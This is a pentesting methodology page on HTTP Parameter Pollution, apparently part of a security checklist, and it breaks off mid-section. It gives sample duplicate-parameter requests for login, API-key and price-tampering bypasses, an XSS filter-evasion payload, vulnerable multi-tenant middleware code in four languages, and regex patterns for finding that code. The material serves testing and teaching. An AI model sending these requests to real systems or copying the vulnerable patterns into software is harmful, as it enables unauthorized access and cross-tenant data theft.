# HTTP Parameter Pollution

## Check List

## Methodology

### Black Box

#### [Test Query String Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution#parameter-pollution-payloads)

{% stepper %}
{% step %}
To test for SSPP in query strings, you can insert query syntax characters like `#`, `&`, and `=` into your input and observe how the application responds
{% endstep %}

{% step %}
Consider a vulnerable application that searches for users based on their username. The request might look like this

```http
GET /usernameSearch?name=jack&returningPath=/main
```
{% endstep %}

{% step %}
The server translates this to an internal API request

```http
GET /usernames/search?name=jack#foo&publicProfile=true
```
{% endstep %}

{% step %}
If the query is truncated, the publicProfile parameter might be bypassed, potentially exposing non-public profiles
{% endstep %}
{% endstepper %}

***

#### Bypassing Authentication

{% stepper %}
{% step %}
Prepare a test login endpoint that accepts username and password parameters
{% endstep %}

{% step %}
Record a normal login request

```http
POST /login
username=admin&password=wrongpassword
```
{% endstep %}

{% step %}
Send the request with multiple password values

```http
POST /login
username=admin&password=wrongpassword&password=correctpassword
```
{% endstep %}

{% step %}
Inspect the server response and session behavior (cookies). If authentication succeeds because the last or a specific occurrence is processed, HPP is present
{% endstep %}
{% endstepper %}

***

#### Manipulating SQL Queries (Overwriting id)

{% stepper %}
{% step %}
Identify the endpoint that reads id and returns a user profile (e.g., `/profile?id=...`)
{% endstep %}

{% step %}
Record a normal request and note the response

```http
GET /profile?id=1
```
{% endstep %}

{% step %}
Send a request with duplicated id parameters

```http
GET /profile?id=1&id=2
```
{% endstep %}
{% endstepper %}

***

#### Tampering with API Calls (API key parameter)

{% stepper %}
{% step %}
Identify an API endpoint using apikey for authentication ( `/api/data?user=123&apikey=...`)
{% endstep %}

{% step %}
Record a request with an invalid key
{% endstep %}

{% step %}
Send a request with multiple apikey parameters where a valid key appears last

```json
GET /api/data?user=123&apikey=invalid-key&apikey=valid-key
```
{% endstep %}

{% step %}
Check whether access is granted; if the last parameter is used and access is allowed, HPP is confirmed
{% endstep %}
{% endstepper %}

***

#### Altering Price Calculations (E-commerce)

{% stepper %}
{% step %}
Locate the checkout endpoint that accepts a price parameter
{% endstep %}

{% step %}
Record a normal purchase request

```json
POST /checkout
product=123&price=100
```
{% endstep %}

{% step %}
Send the request with duplicate price values

```
POST /checkout
product=123&price=100&price=1
```
{% endstep %}

{% step %}
Verify server response, cart totals, or final calculation; if the last price is applied resulting in reduced cost, HPP is present
{% endstep %}
{% endstepper %}

***

#### Bypassing Input Validation and WAF (XSS evasion)

{% stepper %}
{% step %}
Identify a point that reflects or stores user input (e.g., comment parameter)
{% endstep %}

{% step %}
Note a simple blocked input example

```javascript
comment=<script>alert(1)</script>
```
{% endstep %}

{% step %}
Send input with fragmented/duplicated parameter pieces so the server-side reconstruction may bypass filters, for example

```javascript
comment=<scr&comment=ipt>alert(1)</scr&comment=ipt>
```
{% endstep %}
{% endstepper %}

***

#### HTTP Parameter Pollution (Privilege Escalation)

{% stepper %}
{% step %}
First, an attacker identifies a vulnerable endpoint that accepts query parameters. This can be done through manual testing or automated tools like Burp Suite
{% endstep %}

{% step %}
Next, the attacker crafts a request with duplicate parameters or adds unexpected parameters to the URL

```http
https://example.com/api/user?role=admin&role=user
```
{% endstep %}

{% step %}
In this case, if the application does not properly validate the ‘role’ parameter, it might grant admin privileges to the user
{% endstep %}

{% step %}
The attacker then analyzes the server’s response to see if the manipulation led to any unexpected behavior. Successful exploitation can result in privilege escalation, information disclosure, or even remote code execution, depending on the application’s logic
{% endstep %}
{% endstepper %}

***

#### Broken Access Control

{% stepper %}
{% step %}
Enter the site and use the Burp Suite tool to identify the points of a site
{% endstep %}

{% step %}
Identify initial API endpoint

```json
GET /api/v1/user/profile?userId=12345 
```
{% endstep %}

{% step %}
and send simple request to observe normal server behavior
{% endstep %}

{% step %}
Check if you can access other accounts by adding another parameter as shown below

```json
GET /api/v1/user/profile?userId=12345&userId=67890
```
{% endstep %}

{% step %}
If it gives an error, we will keep the value constant, but we will add a parameter and check the behavior of the server

```json
GET /api/v1/user/profile?userId=12345&userId=12345
```
{% endstep %}
{% endstepper %}

***

#### JSON Parameter Pollution In Export Proccess

{% stepper %}
{% step %}
Check out endpoints that perform the extraction process in different formats, for example the following request in an API Endpoint

```json
POST /api/admin/exportData
Content-Type: application/json

{"format":"csv","filters":{"userId":12345}}
```
{% endstep %}

{% step %}
In this request, we have to check what will be the answer to the server's request if we add another format parameter, for example

```json
{"format":"csv","format":"json"}
```
{% endstep %}

{% step %}
If it gives us an error in the answer as below

```json
{"error":"Unexpected token , in JSON at position 15"}
```
{% endstep %}

{% step %}
Send the next request using capital words as shown below

```json
{"format":"csv","Format":"json"}
```
{% endstep %}

{% step %}
in Response

```json
{"status":"processing","file":"/exports/data-2023-10-25.json"}
```
{% endstep %}
{% endstepper %}

***

#### JSON Parameter Pollution Authentication bypass

{% stepper %}
{% step %}
Perform the authentication process and intercept the application process
{% endstep %}

{% step %}
If there are parameters in the request as below

```json
POST /api/auth/verify
Content-Type: application/json

{"token":"user_token_123","role":"user"}
```
{% endstep %}

{% step %}
Try to add other parameters to the request as shown below

```json
{"token":"user_token_123","token":"admin_token_abc","role":"user","role":"admin"}
```
{% endstep %}

{% step %}
The response

```
{"authenticated": true, "user": "admin", "permissions": ["read","write","delete"]}
```
{% endstep %}
{% endstepper %}

***

#### Test Case in Login Parameter

{% stepper %}
{% step %}
Enter the site and use the Burp Suite tool to identify the points of a site
{% endstep %}

{% step %}
Identify initial JSON API endpoint `/api/v1/auth/login`
{% endstep %}

{% step %}
and send simple request to observe normal server behavior

```json
{
    "username": "alice",
    "password": "pass123"
}
```
{% endstep %}

{% step %}
Test HPP by adding duplicate keys as shown below

```json
{
    "username": "alice",
    "password": "pass123",
    "username": "bob"
}
```
{% endstep %}

{% step %}
If it processes first value for auth but last for update, we will keep the key constant but duplicate and check the behavior of the server

```json
{
    "role": "user",
    "role": "admin"
}
```
{% endstep %}

{% step %}
#### Test password reset abuse `/api/v1/reset-password`

```json
POST /api/v1/reset-password
{
    "username": "alice",
    "new_password": "NewPass123",
    "confirm_password": "NewPass123",
    "username": "bob"
}
```
{% endstep %}

{% step %}
#### Test input filter bypass `/api/v1/update-profile`

```json
{
    "email": "justanexample@example.com",
    "email": "<script>alert(1)</script>"
}
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Tenant Compromise via Internal Middleware Query String Append in Legacy Integration Architectures

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a hybrid modernization architecture. In massive enterprise environments (e.g., core banking, telecommunications), modern frontends interact with a newly built, secure API Gateway. This Gateway authenticates users via OAuth2/JWT
{% endstep %}

{% step %}
Investigate the downstream routing architecture. The API Gateway often acts as an anti-corruption layer, proxying requests to a massive, monolithic legacy backend (written in `C++`, older `Java`, or legacy `PHP`) that cannot natively parse or cryptographically validate JWTs
{% endstep %}

{% step %}
Discover the "Context Translation" optimization. To avoid rewriting millions of lines of legacy authentication code, the API Gateway unpacks the JWT, extracts the authenticated `tenant_id` and `user_id`, and explicitly injects them into the downstream HTTP request
{% endstep %}

{% step %}
Analyze the injection mechanism in the decompiled API Gateway. Observe that to maintain maximum compatibility and avoid altering HTTP bodies (which might invalidate content-length headers or break XML parsers), the Gateway developer chooses to inject the identity context directly into the URL query string
{% endstep %}

{% step %}
Locate the fatal string concatenation flaw. The Gateway retrieves the original request URL and simply appends `&tenant_id=...` to the end of the string before dispatching the proxy request
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumed the original query string supplied by the external user did not already contain a `tenant_id` parameter, or assumed that the backend legacy parser would strictly prioritize the appended value
{% endstep %}

{% step %}
Analyze the legacy downstream system's HTTP parsing behavior. Many legacy CGI scripts, older web servers, or specific framework configurations evaluate identical HTTP parameters by returning the _first_ occurrence of the parameter and dropping the rest
{% endstep %}

{% step %}
Authenticate to the modern API Gateway using a low-privilege account belonging to `Tenant_A`
{% endstep %}

{% step %}
Construct a request to a sensitive legacy reporting endpoint. Manually inject the target tenant's ID into the query string: `GET /api/v1/legacy/reports?tenant_id=Tenant_B`
{% endstep %}

{% step %}
The API Gateway validates your JWT, confirms you are `Tenant_A`, and blindly appends your identity to the string. The resulting downstream request becomes: `GET /legacy/reports?tenant_id=Tenant_B&tenant_id=Tenant_A`
{% endstep %}

{% step %}
The legacy system receives the request, parses the query string, stops at the first occurrence, and assigns the active execution context to `Tenant_B`, resulting in a complete cross-tenant data breach

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Request\.QueryString\.Value\s*\+\s*"&|Request\.QueryString(?:\.Value)?\s*\+\s*".*="|QueryHelpers\.AddQueryString\s*\(|UriBuilder[\s\S]{0,120}?Query|new\s+QueryString\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:url\s*\+\s*["']&tenant_id=|url\s*\+\s*["'][^"']+=|UriComponentsBuilder|UriBuilder|queryParam\s*\(|request\.getQueryString\s*\(\)\s*\+)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$downstreamUrl\s*\.\s*['"]&|\$downstreamUrl\s*\.\=\s*['"]&|http_build_query\s*\(|parse_str\s*\(|\$_SERVER\['QUERY_STRING'\]\s*\.)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:proxyUrl\s*\+\s*`&tenant_id=\$\{|url\s*\+\s*['"]&tenant_id=|new\s+URLSearchParams\s*\(|req\.query|req\.originalUrl\s*\+)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.QueryString\.Value\s*\+\s*"&|Request\.QueryString.*\+.*=
```
{% endtab %}

{% tab title="Java" %}
```regexp
url\s*\+\s*["']&tenant_id=|request\.getQueryString\(\)\s*\+|queryParam\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$downstreamUrl\s*\.\s*['"]&|\$downstreamUrl\s*\.\=\s*['"]&|http_build_query\(|parse_str\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
proxyUrl\s*\+\s*`&tenant_id=\$\{|url\s*\+\s*['"]&tenant_id=|URLSearchParams\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class LegacyIntegrationMiddleware 
{
    private readonly HttpClient _downstreamClient;

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        if (context.Request.Path.StartsWithSegments("/api/v1/legacy")) 
        {
            // [1]
            var tenantId = context.User.Claims.FirstOrDefault(c => c.Type == "tenant_id")?.Value;
            var userId = context.User.Claims.FirstOrDefault(c => c.Type == "user_id")?.Value;

            // [2]
            var originalQuery = context.Request.QueryString.Value; // e.g., ?reportType=financial

            // [3]
            // [4]
            var downstreamUrl = $"http://internal-legacy-core.corp/api{context.Request.Path}{originalQuery}&tenant_id={tenantId}&user_id={userId}";

            var proxyRequest = new HttpRequestMessage(HttpMethod.Get, downstreamUrl);
            var response = await _downstreamClient.SendAsync(proxyRequest);
            
            await response.Content.CopyToAsync(context.Response.Body);
            return;
        }

        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class LegacyIntegrationFilter implements Filter {

    @Autowired
    private RestTemplate restTemplate;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;

        if (req.getRequestURI().startsWith("/api/v1/legacy")) {
            // [1]
            String tenantId = (String) req.getAttribute("jwt_tenant_id");
            String userId = (String) req.getAttribute("jwt_user_id");

            // [2]
            String originalQuery = req.getQueryString() != null ? "?" + req.getQueryString() : "?";

            // [3]
            // [4]
            String downstreamUrl = "http://internal-legacy-core.corp" + req.getRequestURI() + originalQuery + "&tenant_id=" + tenantId + "&user_id=" + userId;

            String proxyResponse = restTemplate.getForObject(downstreamUrl, String.class);
            response.getWriter().write(proxyResponse);
            return;
        }

        chain.doFilter(request, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class LegacyIntegrationMiddleware 
{
    public function handle(Request $request, Closure $next) 
    {
        if (strpos($request->getPathInfo(), '/api/v1/legacy') === 0) 
        {
            // [1]
            $tenantId = $request->attributes->get('jwt_tenant_id');
            $userId = $request->attributes->get('jwt_user_id');

            // [2]
            $originalQuery = $request->getQueryString() ? '?' . $request->getQueryString() : '?';

            // [3]
            // [4]
            $downstreamUrl = "http://internal-legacy-core.corp" . $request->getPathInfo() . $originalQuery . "&tenant_id={$tenantId}&user_id={$userId}";

            $proxyResponse = file_get_contents($downstreamUrl);
            return response($proxyResponse);
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class LegacyIntegrationMiddleware {
    static async handle(req, res, next) {
        if (req.path.startsWith('/api/v1/legacy')) {
            // [1]
            let tenantId = req.user.tenantId;
            let userId = req.user.userId;

            // [2]
            let originalQuery = Object.keys(req.query).length ? `?${require('querystring').stringify(req.query)}` : '?';

            // [3]
            // [4]
            let downstreamUrl = `http://internal-legacy-core.corp${req.path}${originalQuery}&tenant_id=${tenantId}&user_id=${userId}`;

            let proxyResponse = await axios.get(downstreamUrl);
            return res.send(proxyResponse.data);
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway extracts the cryptographically verified identity context from the user's JWT, \[2] The middleware captures the raw query string submitted by the external client to preserve pagination, filtering, and sorting parameters intended for the legacy system, \[3] To avoid rebuilding complex URI components or mutating the HTTP body, the developer utilizes raw string concatenation to inject the authenticated state, \[4] The fatal boundary bypass. Because the original query string is placed _before_ the injected authentication parameters, an attacker who manually provides `?tenant_id=TARGET` creates an HTTP Parameter Pollution scenario. If the legacy backend relies on a parser that selects the first occurrence of a duplicate parameter, the gateway's injected, authoritative `tenant_id` is silently discarded, yielding full unauthorized access

```http
// 1. Attacker is logged in as Tenant_A.
// 2. Attacker manually injects the target tenant's ID into the legacy route.
GET /api/v1/legacy/financials/export?format=pdf&tenant_id=Tenant_B_Admin HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <tenant_a_low_priv_token>

// 3. The Gateway validates Tenant A's token, appends the identity, and proxies the request:
// GET /api/v1/legacy/financials/export?format=pdf&tenant_id=Tenant_B_Admin&tenant_id=Tenant_A

// 4. The legacy system parses the parameters, selects the first 'tenant_id', and exports the data.
HTTP/1.1 200 OK
Content-Type: application/pdf

[CONFIDENTIAL FINANCIAL DATA FOR TENANT B]
```
{% endstep %}

{% step %}
To safely integrate modern identity federation with legacy monolithic infrastructure, developers deployed an API Gateway that translates JWT claims into explicit URL query parameters. By utilizing raw string concatenation and appending the authoritative claims to the end of the user-controlled query string, the architecture unknowingly deferred the security enforcement to the downstream system's HTTP parsing logic. The attacker exploited this by intentionally polluting the request with a duplicate authorization parameter. The legacy system's parser captured the attacker's injected parameter first, completely ignoring the API Gateway's cryptographically verified appended string. The optimization designed to prevent legacy code rewrites resulted in a catastrophic, unauthenticated cross-tenant data breach
{% endstep %}
{% endstepper %}

***

#### Cross-Tenant Data Exposure via Parameter Array Type Confusion in Dynamic ORM Filtering

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on data-heavy reporting dashboards or list views
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Dynamic Query Builder" architecture. Enterprise APIs often avoid creating thousands of distinct backend endpoints by utilizing a single generic endpoint (e.g., `GET /api/v1/resources`) that dynamically translates arbitrary HTTP query parameters directly into database queries (e.g., turning `?status=active&department=HR` into `WHERE status='active' AND department='HR'`)
{% endstep %}

{% step %}
Investigate the security enforcement implementation within this generic endpoint. Observe how developers attempt to restrict the dynamically generated query to the user's specific tenant
{% endstep %}

{% step %}
Discover the structural optimization: The developer extracts the parsed HTTP query dictionary, programmatically injects the `TenantId` from the active session context into the dictionary, and passes the entire object to the Object-Relational Mapper (ORM) for dynamic SQL/NoSQL generation
{% endstep %}

{% step %}
Understand the hidden assumption of the web framework's parameter parser. Developers assume that HTTP parameters map 1:1 to String values (e.g., `Map<String, String>`)
{% endstep %}

{% step %}
Recognize the framework's native HPP handling: Modern frameworks (like Spring Web, Express.js, or ASP.NET Core MVC) automatically convert duplicate HTTP parameters into Arrays or Lists to support multiple selections (e.g., `?category=A&category=B` becomes `["A", "B"]`)
{% endstep %}

{% step %}
Analyze the specific data structure used by the controller (e.g., `MultiValueMap`, `StringValues`, or an untyped JavaScript object)
{% endstep %}

{% step %}
Observe the insertion logic. If the attacker supplies `?tenant_id=TARGET_TENANT`, and the developer executes `queryParams.Add("tenant_id", currentUser.TenantId)`, the resulting data structure for `tenant_id` does not overwrite the attacker's input. Instead, it becomes an array: `["TARGET_TENANT", "CURRENT_USER_TENANT"]`
{% endstep %}

{% step %}
Trace this array into the dynamic ORM engine (e.g., Entity Framework, Hibernate, Sequelize)
{% endstep %}

{% step %}
Discover the catastrophic type confusion: When the ORM encounters an Array instead of a String in a generic equality filter, it automatically optimizes the query by translating the equality operator into an SQL `IN` operator
{% endstep %}

{% step %}
Send a request to the generic resource endpoint supplying the target victim's Tenant ID
{% endstep %}

{% step %}
The framework constructs the array. The ORM generates the query: `SELECT * FROM resources WHERE tenant_id IN ('TARGET_TENANT', 'CURRENT_USER_TENANT')`
{% endstep %}

{% step %}
The database returns the records for both tenants. The backend serializes the result and returns the data, executing a massive cross-tenant exposure purely through architectural type confusion

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:filters\.Add\s*\(\s*"tenant_id"\s*,|queryParams\.Add\s*\(\s*"tenant_id"\s*,|Request\.Query\["tenant_id"\]|tenant_id[\s\S]{0,120}?(?:List|Array|IEnumerable)|AddQueryString[\s\S]{0,100}?tenant_id)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:queryParams\.add\s*\(\s*"tenant_id"\s*,|queryParams\.addAll\s*\(\s*"tenant_id"|request\.getParameterValues\s*\(\s*"tenant_id"\s*\)|tenant_id[\s\S]{0,120}?(?:List|Array|Set))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$filters\['tenant_id'\]\s*\[\]\s*=|\$filters\s*\[\s*['"]tenant_id['"]\s*\]\s*=|request\(\s*['"]tenant_id['"]\s*\)|\$_GET\[['"]tenant_id['"]\]\s*\[\])
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.query\.tenant_id\s*=\s*\[\]\.concat|req\.query\.tenant_id\s*=\s*\[|queryParams\.append\s*\(\s*['"]tenant_id['"]|queryParams\.set\s*\(\s*['"]tenant_id['"])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
filters\.Add\("tenant_id"|queryParams\.Add\("tenant_id"|tenant_id.*(List|Array|IEnumerable)
```
{% endtab %}

{% tab title="Java" %}
```regexp
queryParams\.add\("tenant_id"|queryParams\.addAll\("tenant_id"|getParameterValues\("tenant_id"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$filters\['tenant_id'\]\s*\[\]=|\$filters\['tenant_id'\]\s*=
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.query\.tenant_id\s*=\s*\[\]\.concat|req\.query\.tenant_id\s*=\s*\[|queryParams\.append\(['"]tenant_id
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/reporting/dynamic")]
public async Task<IActionResult> GetDynamicReport()
{
    // [1]
    // [2]
    var filters = new Dictionary<string, StringValues>(Request.Query);

    // [3]
    // [4]
    filters.Add("tenant_id", _currentUser.TenantId);

    // ORM dynamically converts StringValues (which is an array of strings) into an SQL 'IN' clause
    var results = await _dynamicRepository.ExecuteDynamicQueryAsync(filters);

    return Ok(results);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/reporting/dynamic")
public ResponseEntity<?> getDynamicReport(HttpServletRequest request) {
    // [1]
    // [2]
    MultiValueMap<String, String> filters = new LinkedMultiValueMap<>();
    request.getParameterMap().forEach((key, values) -> filters.addAll(key, Arrays.asList(values)));

    // [3]
    // [4]
    filters.add("tenant_id", currentUser.getTenantId());

    // ORM dynamically converts MultiValueMap entries into an SQL 'IN' clause
    List<Object> results = dynamicRepository.executeDynamicQuery(filters);

    return ResponseEntity.ok(results);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getDynamicReport(Request $request) 
{
    // [1]
    // [2]
    $filters = $request->query();

    // [3]
    // [4]
    // If the attacker sent ?tenant_id=TARGET, Laravel parses it as a string.
    // If the developer forcefully appends it as an array to avoid overwriting existing complex filters:
    if (!isset($filters['tenant_id'])) {
        $filters['tenant_id'] = [];
    }
    $filters['tenant_id'] = (array) $filters['tenant_id'];
    $filters['tenant_id'][] = $this->currentUser->tenantId;

    // Eloquent dynamically translates arrays to WHERE IN
    $results = $this->dynamicRepository->executeDynamicQuery($filters);

    return response()->json($results);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/reporting/dynamic', async (req, res) => {
    // [1]
    // [2]
    let filters = { ...req.query };

    // [3]
    // [4]
    // Developer attempts to ensure the tenant ID is forced, but accidentally 
    // uses array concatenation to preserve any existing user filters.
    filters.tenant_id = [].concat(filters.tenant_id || [], req.user.tenantId);

    // Sequelize/Mongoose dynamically translates Arrays to $in or WHERE IN
    let results = await dynamicRepository.executeDynamicQuery(filters);

    res.json(results);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The endpoint utilizes a highly optimized dynamic query engine, accepting an arbitrary number of filters from the client to generate complex data grid reports, \[2] The backend framework natively parses the HTTP query string. If duplicate keys exist, the framework's default behavior is to aggregate them into a collection (e.g., `StringValues`, `MultiValueMap`, or Array), \[3] The developer implements the fundamental security boundary. To enforce strict data isolation, they programmatically inject the user's cryptographically verified `TenantId` into the filter collection, \[4] The fatal assumption. The developer assumes the `.Add()` or `.concat()` operation strictly overwrites the key or defines an absolute equality constraint. Instead, it expands the collection. When the dynamic ORM receives `tenant_id: ["TARGET_ORG", "MY_ORG"]`, its internal AST compiler optimizes the query into `WHERE tenant_id IN ('TARGET_ORG', 'MY_ORG')`. The database executes the query perfectly, leaking the target organization's data

```http
// 1. Attacker is logged in as Tenant_A.
// 2. Attacker exploits the dynamic reporting endpoint, injecting the Target Tenant's ID.
GET /api/v1/reporting/dynamic?status=active&tenant_id=Tenant_B_Target HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <tenant_a_token>

// 3. The framework parses the query into a Dictionary/Map.
// 4. The developer's security code appends the authenticated Tenant ID.
// Filters now equal: { "status": "active", "tenant_id": ["Tenant_B_Target", "Tenant_A"] }
// 5. The ORM builds: SELECT * FROM Reports WHERE status='active' AND tenant_id IN ('Tenant_B_Target', 'Tenant_A')

// 6. The API returns the aggregated cross-tenant payload.
HTTP/1.1 200 OK
Content-Type: application/json

[
  { "id": 1, "tenant_id": "Tenant_A", "revenue": 500 },
  { "id": 2, "tenant_id": "Tenant_B_Target", "revenue": 99000000 }
]
```
{% endstep %}

{% step %}
To support massive frontend data grids without writing thousands of bespoke backend endpoints, the architecture implemented a generic, dynamic ORM query builder. To enforce multi-tenant isolation within this generic pipeline, the developer programmatically injected the active user's Tenant ID into the HTTP query parameter collection prior to ORM execution. The developer failed to account for the framework's native handling of HTTP Parameter Pollution. When the attacker supplied a duplicate `tenant_id` parameter, the framework aggregated the values into a list. The `Add()` operation simply appended the authenticated ID to the attacker's list. The dynamic ORM evaluated the list, correctly mapped it to a SQL `IN` operator, and executed the query. The database flawlessly returned the combined datasets of both organizations, achieving a massive cross-tenant data breach via type confusion
{% endstep %}
{% endstepper %}

***

#### Administrative Action Hijacking via Parser Desynchronization in WAF/API Gateway Routing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on monolithic or legacy endpoints that process multiple distinct operations through a single URI (e.g., GraphQL endpoints, RPC endpoints, or generic dispatchers like `/api/v1/execute?action=X`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the enterprise perimeter security architecture. In complex environments, authorization policies (RBAC) are often enforced at the edge by a Web Application Firewall (WAF) or a custom security sidecar (e.g., written in Go, C, or Lua inside Nginx/Envoy)
{% endstep %}

{% step %}
Investigate the "Deep Packet Inspection" (DPI) optimization. Because the backend utilizes a monolithic dispatcher endpoint, the Edge Gateway must inspect the HTTP Query String to determine the user's intent
{% endstep %}

{% step %}
Observe the access control policy defined at the edge. The Gateway maps specific query parameter values to specific roles (e.g., if `?action=ViewAuditLog`, require `User` role; if `?action=DeleteDatabase`, require `Admin` role)
{% endstep %}

{% step %}
Analyze the parameter parsing implementation inside the Edge Gateway. Discover that the Gateway parses the query string linearly and, upon encountering duplicate parameters, selects the _first_ occurrence to optimize CPU cycles and memory allocation
{% endstep %}

{% step %}
Decompile the downstream monolithic application (written in C#, Java, PHP, or Node.js)
{% endstep %}

{% step %}
Analyze the downstream application's native HTTP parameter parsing behavior. Discover the architectural desynchronization: The downstream application framework natively processes duplicate parameters by overriding previous values, effectively selecting the _last_ occurrence
{% endstep %}

{% step %}
Understand the boundary collapse: The Edge Gateway and the downstream application fundamentally disagree on the state of the HTTP request
{% endstep %}

{% step %}
Authenticate to the application using a low-privilege standard user account
{% endstep %}

{% step %}
Construct a request targeting the monolithic dispatcher endpoint
{% endstep %}

{% step %}
Inject HTTP Parameter Pollution into the query string. Place the authorized, low-privilege action first, and the highly destructive, unauthorized administrative action last (e.g., `POST /api/v1/dispatch?action=ViewAuditLog&action=DeleteDatabase`)
{% endstep %}

{% step %}
The Edge Gateway intercepts the request, reads the _first_ `action` parameter (`ViewAuditLog`), validates that the user possesses the standard `User` role, and permits the request to pass through the perimeter
{% endstep %}

{% step %}
The downstream monolithic application receives the request, parses the query string, overrides the first parameter with the _last_ parameter, and executes `DeleteDatabase`, completing a catastrophic bypass of the edge authorization perimeter

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Request\.Query\["action"\]\.LastOrDefault\s*\(\s*\)|Request\.Query\["[^"]+"\]\.LastOrDefault\s*\(\s*\)|GetValues\s*\(\s*"[^"]+"\s*\)\s*\[[^\]]*Length\s*-\s*1\])
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:request\.getParameterValues\s*\(\s*"action"\s*\)\s*\[\s*.*length\s*-\s*1\s*\]|getParameterValues\s*\(\s*"[^"]+"\s*\)\s*\[[^\]]*length\s*-\s*1\]|Arrays\.stream\s*\([\s\S]{0,80}?getParameterValues)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:end\s*\(\s*\$_GET\['action'\]\s*\)|end\s*\(\s*\$_REQUEST\['[^']+'\]\s*\)|array_pop\s*\(\s*\$_GET\['[^']+'\]\s*\)|\$_GET\['[^']+'\]\s*\[\s*count\s*\([^\)]*\)-1\s*\])
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:req\.query\.action\s*\[\s*req\.query\.action\.length\s*-\s*1\s*\]|req\.query\.[a-zA-Z0-9_]+\s*\[[^\]]*length\s*-\s*1\]|Array\.isArray\s*\(\s*req\.query\.[a-zA-Z0-9_]+\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.Query\["action"\]\.LastOrDefault\(\)|GetValues\(".*"\).*\[.*Length\s*-\s*1\]
```
{% endtab %}

{% tab title="Java" %}
```regexp
request\.getParameterValues\("action"\)\[.*length\s*-\s*1\]|getParameterValues\(".*"\).*\[.*length\s*-\s*1\]
```
{% endtab %}

{% tab title="PHP" %}
```regexp
end\(\$_GET\['action'\]\)|end\(\$_REQUEST\['.*'\]\)|array_pop\(\$_GET
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.query\.action\[req\.query\.action\.length\s*-\s*1\]|req\.query\..*\[.*length\s*-\s*1\]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// Inside the monolithic backend application
[HttpPost("/api/v1/dispatch")]
public async Task<IActionResult> DispatchAction() 
{
    // [1]
    // [2]
    var actionArray = Request.Query["action"];
    
    // [3]
    // [4]
    var finalAction = actionArray.LastOrDefault(); 

    if (finalAction == "DeleteDatabase") 
    {
        await _systemService.DestroyDatabaseAsync();
        return Ok("Database Destroyed");
    }
    
    return Ok("Action Executed");
}

// Inside the custom Go-based Edge WAF (Hypothetical Context):
// action := r.URL.Query().Get("action") // Go's .Get() returns the FIRST occurrence
// if action == "DeleteDatabase" && user.Role != "Admin" { return 403; }
```
{% endtab %}

{% tab title="Java" %}
```java
// Inside the monolithic backend application
@PostMapping("/api/v1/dispatch")
public ResponseEntity<?> dispatchAction(HttpServletRequest request) {
    // [1]
    // [2]
    String[] actionArray = request.getParameterValues("action");
    
    // [3]
    // [4]
    String finalAction = actionArray != null ? actionArray[actionArray.length - 1] : null;

    if ("DeleteDatabase".equals(finalAction)) {
        systemService.destroyDatabase();
        return ResponseEntity.ok("Database Destroyed");
    }
    
    return ResponseEntity.ok("Action Executed");
}

// Inside the custom C-based Nginx Lua WAF (Hypothetical Context):
// local action = ngx.req.get_uri_args()["action"]
// if type(action) == "table" then action = action[1] end -- Selects FIRST
```
{% endtab %}

{% tab title="PHP" %}
```php
// Inside the monolithic backend application
